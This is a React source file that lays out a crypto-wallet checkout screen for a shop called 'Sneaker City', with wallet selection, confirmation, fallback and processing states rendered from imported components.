import { useCheckoutState } from './hooks/useCheckoutState';
import { SmartDock } from './components/SmartDock';
import { WalletGrid } from './components/WalletGrid';
import { HybridPanel } from './components/HybridPanel';
import { FallbackConsole } from './components/FallbackConsole';
import { HelpCircle, Loader2, ShieldCheck } from 'lucide-react';

function App() {
  const { state, selectedWallet, selectWallet, confirmHybridAction, reset } = useCheckoutState();

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4 font-sans text-gray-900 relative overflow-hidden">
      {/* Background Decor */}
      <div className="absolute top-0 -left-20 w-96 h-96 bg-indigo-300 rounded-full mix-blend-multiply filter blur-3xl opacity-30 animate-blob"></div>
      <div className="absolute top-0 -right-20 w-96 h-96 bg-purple-300 rounded-full mix-blend-multiply filter blur-3xl opacity-30 animate-blob animation-delay-2000"></div>
      <div className="absolute -bottom-32 left-20 w-96 h-96 bg-pink-300 rounded-full mix-blend-multiply filter blur-3xl opacity-30 animate-blob animation-delay-4000"></div>

      <div className="w-full max-w-md bg-white/90 backdrop-blur-xl rounded-[2.5rem] shadow-2xl shadow-indigo-500/10 overflow-hidden min-h-[700px] flex flex-col relative border border-white/50 ring-1 ring-gray-100 transition-all duration-500">

        {/* Header */}
        <div className="p-8 pb-2 z-10">
          <div className="flex justify-between items-center mb-8">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-gradient-to-br from-indigo-600 to-indigo-700 rounded-xl shadow-lg shadow-indigo-500/30 flex items-center justify-center text-white font-bold text-xl">B</div>
              <div>
                <span className="font-bold text-lg tracking-tight text-gray-900 block leading-tight">Sneaker City</span>
                <span className="text-[10px] text-green-600 font-bold bg-green-50 px-2 py-0.5 rounded-full border border-green-100 flex items-center w-fit gap-1">
                  <ShieldCheck size={10} /> Verified Merchant
                </span>
              </div>
            </div>
            <button className="w-10 h-10 flex items-center justify-center rounded-full bg-gray-50 text-gray-400 hover:text-gray-900 hover:bg-gray-100 transition-all">
              <HelpCircle size={20} />
            </button>
          </div>

          <div className="text-center mb-2 transform hover:scale-105 transition-transform duration-300 cursor-default">
            <div className="text-gray-400 text-xs font-bold uppercase tracking-[0.2em] mb-2">Total Amount</div>
            <div className="text-5xl font-extrabold text-gray-900 tracking-tighter relative inline-block">
              <span className="text-3xl align-top mr-1 font-bold text-gray-400">$</span>20.00
            </div>
          </div>
        </div>

        {/* Content Area */}
        <div className="flex-1 p-8 pt-4 relative">

          {state === 'SELECTION' && (
            <div className="animate-in fade-in slide-in-from-bottom-8 duration-700 ease-out">
              <SmartDock onSelect={selectWallet} />
              <WalletGrid onSelect={selectWallet} excludeIds={['binance', 'metamask']} />
            </div>
          )}

          {state === 'HYBRID_ACTION' && selectedWallet && (
            <HybridPanel
              walletId={selectedWallet}
              onConfirm={confirmHybridAction}
              onBack={reset}
            />
          )}

          {state === 'FALLBACK' && (
            <FallbackConsole onRetry={reset} />
          )}

        </div>

        {/* Processing Overlay */}
        {state === 'PROCESSING' && (
          <div className="absolute inset-0 bg-white/80 backdrop-blur-md z-30 flex flex-col items-center justify-center animate-in fade-in duration-500">
            <div className="relative mb-8">
              <div className="w-20 h-20 border-4 border-indigo-100 border-t-indigo-600 rounded-full animate-spin"></div>
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="w-16 h-16 bg-white rounded-full shadow-lg flex items-center justify-center">
                  <Loader2 size={32} className="text-indigo-600 animate-pulse" />
                </div>
              </div>
            </div>
            <h3 className="font-bold text-gray-900 text-xl mb-2">Connecting to Wallet...</h3>
            <p className="text-gray-500 text-sm max-w-[200px] text-center leading-relaxed">Please check your device to approve the request.</p>
          </div>
        )}

        {/* Footer */}
        <div className="p-6 text-center border-t border-gray-50 bg-gray-50/50 backdrop-blur-sm">
          <div className="text-[10px] text-gray-400 font-medium tracking-wide">
            Powered by <span className="font-bold text-indigo-900 flex-inline items-center gap-1 mx-1">Bonuspay</span> Secure Checkout
          </div>
        </div>
      </div>
    </div>
  )
}

export default App
